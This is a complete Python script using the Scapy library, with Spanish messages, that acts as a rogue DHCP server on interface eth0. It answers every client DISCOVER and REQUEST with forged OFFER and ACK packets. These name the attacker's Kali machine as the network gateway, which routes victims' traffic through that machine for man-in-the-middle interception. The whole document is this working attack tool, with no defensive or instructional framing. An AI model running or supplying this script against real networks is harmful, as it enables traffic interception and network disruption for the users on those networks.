import sys
import os
from scapy.all import *

if os.geteuid() != 0:
    sys.exit("[-] Ejecuta este script usando sudo.")

print("[+] Servidor DHCP Falso Activo...")
print("[+] Escuchando peticiones de red en eth0...")

interfaz = "eth0"
ip_kali = "10.24.21.2"
ip_ofrecida = "10.24.21.50"
netmask = "255.255.255.0"
gateway_falso = "10.24.21.2"
dns_falso = "8.8.8.8"

def enviar_dhcp_packet(packet_type, client_mac, xid, chaddr):
    msg_type = "offer" if packet_type == 1 else "ack"
    pkt = (
        Ether(src=RandMAC(), dst=client_mac) /
        IP(src=ip_kali, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(op=2, yiaddr=ip_ofrecida, siaddr=ip_kali, chaddr=chaddr, xid=xid) /
        DHCP(options=[
            ("message-type", msg_type),
            ("server_id", ip_kali),
            ("subnet_mask", netmask),
            ("router", gateway_falso),
            ("name_server", dns_falso),
            "end"
        ])
    )
    sendp(pkt, iface=interfaz, verbose=False)
    print(f"[+] Enviado DHCP {msg_type.upper()} con la IP {ip_ofrecida}")

def procesar_dhcp(packet):
    if packet.haslayer(DHCP):
        opts = packet[DHCP].options
        msg_type = opts[0][1]
        client_mac = packet[Ether].src
        xid = packet[BOOTP].xid
        chaddr = packet[BOOTP].chaddr
        
        if msg_type == 1: # DISCOVER
            print(f"\n[!] Detectado DHCP DISCOVER desde: {client_mac}")
            enviar_dhcp_packet(1, client_mac, xid, chaddr)
        elif msg_type == 3: # REQUEST
            print(f"[!] Detectado DHCP REQUEST desde: {client_mac}")
            enviar_dhcp_packet(2, client_mac, xid, chaddr)

sniff(iface=interfaz, filter="udp and port 67", prn=procesar_dhcp, store=0)
